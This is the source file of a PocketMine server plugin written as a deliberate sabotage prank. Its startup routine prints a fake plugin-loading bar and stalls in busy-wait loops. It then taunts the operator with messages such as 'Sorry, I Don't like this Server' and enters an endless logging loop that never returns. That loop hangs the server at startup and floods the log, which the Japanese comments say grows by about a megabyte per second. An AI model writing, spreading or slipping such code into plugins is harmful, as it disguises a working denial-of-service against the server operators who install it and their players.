<?php
namespace kurisan_fox\weiwei;

use pocketmine\plugin\PluginBase;

class Main extends PluginBase

{
    public function onEnable()
    {
        $this->getLogger()->notice("§aLoading Plugin Baka Plugin...");
        $fakeloadingbar = 0;
        while($fakeloadingbar<100){
            $fakeloadingbar = ($fakeloadingbar + 0.25);
            $wait = 0;
            while($wait <= 25){
                $wait = $wait + 1;
            }
            if($fakeloadingbar > 100){
                $fakeloadingbar = 100;
            }
            $this->getLogger()->notice("Loading Plugins...: $fakeloadingbar");
        }
        $this->getLogger()->notice("§aEND OF THREAD...");
        $wait = 0;
        while($wait < 10000000){
            $wait = ($wait + 1);
        }
        $this->getLogger()->notice("Oh no, You have Server Blocker.");
        $this->getLogger()->notice("Sorry, I Don't like this Server.");
        $this->getLogger()->notice("Hmmm Please wait, Don't Worry.");
        $wait = 0;
        while($wait < 25100000){
            $wait = ($wait + 1);
        }
        $this->getLogger()->notice("Ok, LOGGGGG");
        while($wait< 2500000){
            $wait = ($wait + 1);
        }
        // １秒に１メガバイトくらい増えるところです。
        // 史上最悪のプラグイン。
        $wait = 0;
        $dostopserver = 1;
        $timelost = 0.5;
        while($dostopserver==1){
            $timelost = ($timelost + 0.0001);
            $this->getLogger()->notice("TIME: $timelost");
        }
    }
    public function onDisable()
    {
        $this->getLogger()->notice("§cOH MY GOD!!!!!!!! You are Hacker?!)");
    }
}
